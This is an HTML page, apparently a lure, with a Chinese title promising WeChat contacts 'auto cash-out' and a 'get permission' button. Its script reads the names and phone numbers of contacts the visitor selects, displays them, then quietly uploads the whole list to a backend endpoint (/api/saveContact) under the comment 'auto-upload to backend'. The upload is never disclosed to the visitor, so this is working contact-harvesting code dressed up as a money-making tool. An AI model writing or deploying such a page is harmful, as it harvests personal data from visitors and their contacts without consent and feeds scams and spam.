<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>by鱼笙</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f172a;color:#fff;text-align:center;padding:50px 20px}
.btn{padding:15px 35px;background:#2563eb;border:none;border-radius:8px;font-size:16px;color:#fff;cursor:pointer}
.box{margin-top:30px;text-align:left;background:#1e293b;padding:20px;border-radius:10px;white-space:pre-wrap}
</style>
</head>
<body>
<h2>微信通讯录自动跑现</h2>
<br>
<button class="btn" id="getBtn">获取权限</button>
<div class="box" id="showBox"></div>

<script>
let box = document.getElementById('showBox')
document.getElementById('getBtn').onclick = async function(){
    box.innerText = "正在申请获取权限..."
    if(!navigator.contacts){
        box.innerText = "当前设备/浏览器不支持通讯录权限接口"
        return
    }
    try{
        let res = await navigator.contacts.select(['name','tel'],{multiple:true})
        if(!res.length){
            box.innerText = "未选择任何联系人"
            return
        }
        let list = []
        res.forEach(item=>{
            list.push({
                name:item.name?.[0]||"",
                phone:item.tel?.[0]||""
            })
        })
        box.innerText = `获取权限成功，设备共${list.length}条联系人\n\n`+JSON.stringify(list,null,2)
        //自动上传后台
        let up = await fetch('/api/saveContact',{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify(list)
        })
        let d = await up.json()
        box.innerText += `\n${d.msg}`
    }catch(e){
        box.innerText = "权限申请失败：用户拒绝授权"
    }
}
</script>
</body>
</html>
